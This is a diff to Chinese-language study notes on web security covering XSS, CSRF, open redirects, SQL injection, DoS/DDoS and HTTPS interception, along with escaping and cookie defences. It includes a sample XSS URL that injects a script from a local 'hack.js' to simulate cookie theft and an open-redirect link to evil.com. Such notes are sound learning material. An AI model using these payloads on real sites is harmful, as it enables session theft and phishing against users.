@@ -152,7 +152,7 @@ https://juejin.cn/post/6844903842635579405#heading-5
 https://www.eggjs.org/zh-CN/core/security
 https://github.com/ljianshu/Blog/issues/56
 
-1:XSS 攻击的本质是将用户数据当成了 HTML 代码一部分来执行，从而混淆原本的语义，产生新的语义。
+#! 1:XSS 攻击的本质是将用户数据当成了 HTML 代码一部分来执行，从而混淆原本的语义，产生新的语义。
   模拟获取cookie-----http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
   XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，
   从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。
@@ -164,7 +164,7 @@ https://github.com/ljianshu/Blog/issues/56
   转义字符，引号、尖括号、斜杠进行转义  str = str.replace(/&/g, '&amp;') str = str.replace(/</g, '&lt;')
   HttpOnly Cookie
   
-2:CSRF 英文全称是 Cross-site request forgery,所以又称为“跨站请求伪造”,是指黑客引诱用户打开黑客的网站,在黑客的网站中,利用用户的登录状态发起的跨站请求。简单来讲,「CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。
+#! 2:CSRF 英文全称是 Cross-site request forgery,所以又称为“跨站请求伪造”,是指黑客引诱用户打开黑客的网站,在黑客的网站中,利用用户的登录状态发起的跨站请求。简单来讲,「CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。
 
 防御:
   Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送
@@ -174,14 +174,14 @@ https://github.com/ljianshu/Blog/issues/56
 3:URL跳转漏洞
   http://www.wooyun.org/login.php?jumpto=http://www.evil.com
 
-4:SQL注入
+#! 4:SQL注入
   访问用户信息  user表被删除
 
-5:DOS和DDOS攻击
+#! 5:DOS和DDOS攻击
   在DoS攻击中，攻击者通过伪造ACK数据包，希望Server重传某些数据包，Server根据TCP重转机制，进行数据重传。攻击者利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源
   DDoS的攻击策略侧重于通过很多“僵尸主机”，向受害主机发送大量看似合法的网络包，从而造成网络阻塞或服务器资源耗尽而导致拒绝服务
 
-6: https中间人攻击
+#! 6: https中间人攻击
 
 
 #! 浏览器缓存 :::::::::::: https://github.com/ljianshu/Blog/issues/23 
